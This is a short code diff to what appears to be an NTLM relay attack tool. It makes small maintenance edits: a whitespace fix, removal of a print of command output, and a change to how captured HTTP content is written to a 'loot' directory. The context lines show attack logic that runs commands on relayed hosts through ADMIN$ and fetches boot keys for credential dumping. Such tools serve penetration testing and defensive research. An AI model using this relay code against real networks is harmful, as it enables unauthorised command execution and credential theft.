@@ -23,7 +23,7 @@
 # working on any LM Compatibility level. The only way to stop this attack 
 # is to enforce on the server SPN checks and or signing.
 # 
-# If the target system is enforcing signing and a machine account was provided, 
+# If the target system is enforcing signing and a machine account was provided,
 # the module will try to gather the SMB session key through 
 # NETLOGON (CVE-2015-0005)
 #
@@ -102,7 +102,6 @@ class SMBAttack(Thread):
                     logging.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
                     self.__answerTMP = ''
                     self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
-                    print self.__answerTMP
                     self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
                 else:
                     bootKey = remoteOps.getBootKey()
@@ -215,7 +214,7 @@ class HTTPAttack(Thread):
         fileName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username.decode('utf-16-le')) + '-' + safeTargetName + '.html'
         #Write it to the file
         with open(os.path.join(self.config.lootdir,fileName),'w') as of:
-            of.write(self.client.lastresult.content)
+            of.write(self.client.lastresult)
 
 # Process command-line arguments.
 if __name__ == '__main__':
